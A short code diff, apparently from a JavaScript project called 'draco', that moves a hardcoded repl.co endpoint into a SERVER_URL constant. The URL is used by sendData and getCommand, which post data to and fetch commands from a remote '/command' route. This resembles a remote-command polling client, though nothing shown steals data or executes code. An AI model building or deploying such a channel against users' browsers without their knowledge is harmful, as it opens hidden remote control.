@@ -1,8 +1,10 @@
+const SERVER_URL = 'https://masti1.mausamvora.repl.co'
+
 // Some useless comment
 localStorage.setItem("draco_function_index", 0);
 
 const sendData = async (data) => {
-    await fetch(`https://draco.maalolan.repl.co/command`, {
+    await fetch(`${SERVER_URL}/command`, {
         method: 'POST', // or 'PUT'
         headers: {
             'Accept': 'application/json',
@@ -14,7 +16,7 @@ const sendData = async (data) => {
 
 
 const getCommand = async () => {
-    await fetch('https://draco.maalolan.repl.co/command', {
+    await fetch(`${SERVER_URL}/command`, {
         headers: {
             'Accept': 'application/json',
             'Content-Type': 'application/json',
